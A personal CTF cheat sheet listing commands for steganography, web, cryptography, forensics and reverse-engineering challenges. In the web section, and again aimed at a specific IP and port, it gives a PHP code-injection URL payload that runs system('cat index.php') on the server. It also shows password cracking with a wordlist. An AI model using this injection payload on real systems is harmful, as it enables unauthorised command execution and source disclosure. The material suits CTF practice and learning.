# CTF

- [Steganography](#stenography)
  - [Steganography audio](#stenographyaudio)
- [Web](#web)
- [Cryptography](#crypto)
- [Forensics](#forensics)
- [Reverse Engineering](#rev)

## Steganography <a name="stenography"></a>

- ```steghide extract -sf image.jpg -p <password>```
- ```stegcracker imag.png /user/share/wordlists/rockyou.txt```
- ```file image.png```
- ```strings image.png```
- ```pngcheck image.png```
- ```sudo apt install libimage-exiftool-perl -y```
  - ```exiftool image.png```
  - ```eog image.png```
- ```xxd image.png```
  - if you see IEND chunk in exiftool use this command.
- Download the stegsolve.jar in any GitHub
  - ```java -jar stegsolve.jar```
  - make sure that you give the permission. 
- [ZXing Decoder](https://zxing.org/w/decode.jspx)
  - If the image is QR code image
- ```sudo apt install ruby```
  - ```sudo gem install zsteg```
  - ```zsteg image.png``` or ```zsteg  -a image.png```
  - only for png image.
- ```binwalk -e image.png```
  - ```binwalk --dd = ".*" image.png```
- ```outguess -r image.png flag.txt```
  - for the LSB.
- [Unicode](https://330k.github.io/misc_tools/unicode_steganography.html) 
  - zero width space
## Steganography audio <a name="stenographyaudio"></a>
- [Morsecode](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)
- [stegolsb](https://github.com/ragibson/Steganography.git)
  - If the audio is related to LSB
  - ```cd Steganography```
  - give the permission
  - ```python3 setup.py install```
  - ```stegolsb wavsteg -r -i file.wav -o flag.txt -n 2 -b 1000```




## Web <a name="web"></a>
- ```http://127.0.0.1:808/index.php?page=' and die(system("cat index.php")) or ' ```
  - if you want to read the index.php use this payload in the url "    ' and die(system("cat index.php")) or ' "
- ```curl -X POST --data hash=2196812e91c29df34f5e217cfd639881 "http://example.com:8080/admin.php"```
  - you use this if you found hash in the sorce page
- ```wget -m http://example.com:8080/```
  - here it will download the all the file in the website
  - ```grep -R "CTF{.*}"``` use this commond after download the all files

## Cryptography <a name="crypto"></a>
1. This is [Hill Cipher](https://www.dcode.fr/hill-cipher), see how it works or use an online decoder
```
-------------------------
|76 |101|115|116|101|114|
-------------------------
|32 |83 |97 |110|100|101|
-------------------------
|114|115|32 |115|104|111|
-------------------------
|117|108|100|32 |104|101|
-------------------------
|108|112|32 |121|111|117|
-------------------------
|32 |58 |41 |41 |41 |42 |
-------------------------

KLZCOUKTVOUWUKDOBGZVJIIIRGVHXCRQUCNOX_IBBL 
```
![image](https://github.com/Chittu13/CTF/blob/main/image/hill_cipher.png)
  - flag ```CTF{BTW_EXISTS_AN_INTERESTING_FILM_ABOUT_HILLS}```
2. http://62.173.140.174:46005/index.php?page=' and die(system("cat index.php")) or '
    - if the web is old version use this in the url
3. Replace small letters with A, capital letters with B
    - ```BA BAAB AAABABAAAAABB AAA BBBBAA BBABAAA BA ABBABAAAB AABAAAA AB AAAAAA AABABB BBAABBABBAABA```
    - [bacon-cipher](https://www.dcode.fr/bacon-cipher)
## Forensics <a name="forensics"></a>
- [outer space audio](https://github.com/colaclanth/sstv.git)
  - ```sudo python3 setup.py install```
  - ```sstv -d file.wav -o result.png```
  - if the hit is related about SSTV(slow scan TV)

## Reverse Engineering <a name="rev"></a>
- ```ltrace ./filename```
  - The file is executable_file so we use ./filename
- ```strace ./filename```
- [ghidra](https://github.com/NationalSecurityAgency/ghidra/releases)
  - Download the zip file from the above line```hidra_11.0.3_PUBLIC_20240410.zip```
